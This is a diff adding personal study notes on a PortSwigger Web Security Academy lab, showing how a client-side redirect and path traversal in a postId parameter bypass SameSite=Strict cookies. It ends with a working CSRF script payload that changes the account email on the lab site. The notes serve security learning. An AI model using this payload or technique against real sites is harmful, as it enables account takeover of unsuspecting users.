@@ -361,6 +361,62 @@ From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions>
 
 From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
 
+**SameSite Strict bypass via client-side redirect**
+
+
+If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+
+If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely. 
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+When login 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29d81d35-7e9a-4577-ac67-f6db54ed928b)
+
+
+
+
+
+We get a redirection page when posting a arbitrary comment
+This correlate to the following js 
+• Study the JavaScript and notice that this uses the postId query parameter to dynamically construct the path for the client-side redirect. 
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/92921d4d-9048-4301-92e5-9c8828f55bfd)
+
+
+
+
+
+Visit our redirect 
+`https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=foo`
+JavaScript attempts to redirect you to a path containing your injected string, for example, /post/foo
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/82591acf-89af-4005-a441-84d145fe56c8)
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 
+
+Directory traversal 
+• Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site. 
+• This mean we can control our postID parameter 
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 
+
+
+```
+https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a9111324-1e12-4004-b90f-f6ffabb8d0c4)
+
+
+
+Our payload
+```
+<script>
+    document.location = "https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+```
 
 
 
